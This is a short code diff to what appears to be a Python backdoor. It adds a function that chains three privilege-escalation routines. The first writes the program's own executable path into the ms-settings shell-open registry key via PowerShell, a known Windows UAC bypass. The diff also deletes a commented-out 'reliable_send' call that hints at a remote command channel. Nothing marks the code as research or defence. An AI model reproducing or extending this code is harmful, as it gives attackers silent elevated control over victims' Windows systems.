@@ -12,6 +12,14 @@ elif __file__:
 exe_path = os.path.join(application_path, exe_name)
 print(exe_path)
 
+
+def priv():
+    res = ""
+    res+= priv1()
+    res+= priv2()
+    res+= priv3()
+    return res
+
 def priv1():
     execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "'+exe_path+'" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
@@ -33,6 +41,5 @@ def priv3():
                                    stdin=subprocess.PIPE)
     result2 = execute2.stdout + execute2.stderr
     result2 = result2.decode()
-    # reliable_send("CMD")
     print(result2)
     return result2
